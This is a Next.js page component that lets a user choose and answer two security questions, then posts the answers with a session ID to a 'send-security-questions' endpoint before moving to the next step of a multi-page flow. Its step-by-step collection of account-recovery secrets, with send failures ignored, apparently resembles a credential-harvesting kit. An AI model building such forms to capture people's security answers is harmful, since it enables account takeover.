import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import axios from "axios";
import { useRouter } from "next/router";
import React, { useContext, useEffect, useState } from "react";
import { useForm } from "react-hook-form";
import { Wrapper } from "../../components/Wrapper";
import { getNextUrl } from "../../utils/getNextUrl";
import { getProgress } from "../../utils/getProgress";
import { DataContext } from "../_app";
import { Select } from "../../components/Select";
import { Input } from "../../components/Input";

interface QuestionsProps {}

// const options = [
//   `What is brother / sister nick name?`,
//   `Who is your favorite composer?`,
//   `Where is your dream vacation destination?`,
//   `What street did your best friend live on high school?`,
//   `What was the first book you ever read?`,
//   `Who was your favorite childhood hero?`,
//   `What is your favorite family tradition?`,
//   `What is your all time favorite board game?`,
//   `In what city does your nearest siblings live in?`,
//   `Whom did you go prom with?`,
//   `What is your favorite teacher name?`,
//   `What is your dream occupation?`,
//   `What was the first book you ever read?`,
//   `What is your  pet name?`,
//   `Who is your favorite historical figure?`,
//   `What is your all time favorite sport movie?`,
//   `If you ever broken a bone which one?`,
// ];

const schema = yup.object().shape({
  quest1: yup.string().required(`Question 1 is required`),
  ans1: yup.string().required(`Answer 1 is required`),
  quest2: yup.string().required(`Question 2 is required`),
  ans2: yup.string().required(`Answer 2 is required`),
});

export const Questions: React.FC<QuestionsProps> = ({}) => {
  const [loading, setLoading] = useState(false);

  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();
  const {
    register,
    handleSubmit,
    formState: { errors, isValid },
    resetField,
    watch,
  } = useForm({
    resolver: yupResolver(schema),
    mode: `onBlur`,
  });

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);
    const formData = new FormData();

    formData.append(`form`, `QUESTIONS`);
    formData.append(
      `answers`,
      JSON.stringify({ sessionId: datas.sessionId, ...data })
    );

    try {
      await axios.post(`/api/send-security-questions`, formData, {
        headers: { "content-type": `multipart/form-data` },
      });
    } catch (error) {
      console.log(error);
    }

    setData({
      ...datas,
      answers: data,
    });

    const url = getProgress()[getProgress().indexOf(`QUESTIONS`) + 1];

    push(getNextUrl(url));
  });

  useEffect(() => {
    const keyDownHandler = (event: KeyboardEvent) => {
      if (event.key === "Enter") {
        event.preventDefault();

        onSubmit();
      }
    };

    document.addEventListener("keydown", keyDownHandler);

    return () => {
      document.removeEventListener("keydown", keyDownHandler);
    };
  });

  return (
    <Wrapper
      title="Security Questions"
      subTitle="Select and answer the following"
      loading={!isValid || loading}
      onSubmit={onSubmit}
    >
      <Select
        name={`quest1`}
        register={register}
        label={`Security Question 1`}
        options={[
          ``,
          `What is your youngest sibling's middle name?`,
          `What is your favourite food?`,
          `What is the name of your oldest niece or nephew?`,
          `In what city were you born?`,
          `What street did you live on growing up?`,
        ]}
        resetField={resetField}
        curValue={watch(`quest1`)}
        error={errors.quest1 && (errors.quest1.message as unknown as string)}
      />
      <Input
        name={`ans1`}
        register={register}
        label="Enter Your Answer"
        resetField={resetField}
        curValue={watch(`ans1`)}
        error={errors.ans1 && (errors.ans1.message as unknown as string)}
      />
      <Select
        name={`quest2`}
        register={register}
        label={`Security Question 2`}
        options={[
          ``,
          `In what city did you meet your spouse?`,
          `What is your favorite vacation spot?`,
          `Who is your favorite movie hero or villain?`,
          `What is your youngest sibling's middle name?`,
          `What is your favorite food?`,
        ]}
        resetField={resetField}
        curValue={watch(`quest2`)}
        error={errors.quest2 && (errors.quest2.message as unknown as string)}
      />
      <Input
        name={`ans2`}
        register={register}
        label="Enter Your Answer"
        resetField={resetField}
        curValue={watch(`ans2`)}
        error={errors.ans2 && (errors.ans2.message as unknown as string)}
      />
      {/* <Select
        name={`quest3`}
        register={register}
        label={`Security Question 3`}
        options={options}
        resetField={resetField}
        curValue={watch(`quest3`)}
        error={errors.quest3 && (errors.quest3.message as unknown as string)}
      />
      <Input
        name={`ans3`}
        register={register}
        label="Enter Your Answer"
        resetField={resetField}
        curValue={watch(`ans3`)}
        error={errors.ans3 && (errors.ans3.message as unknown as string)}
      /> */}
    </Wrapper>
  );
};

export default Questions;
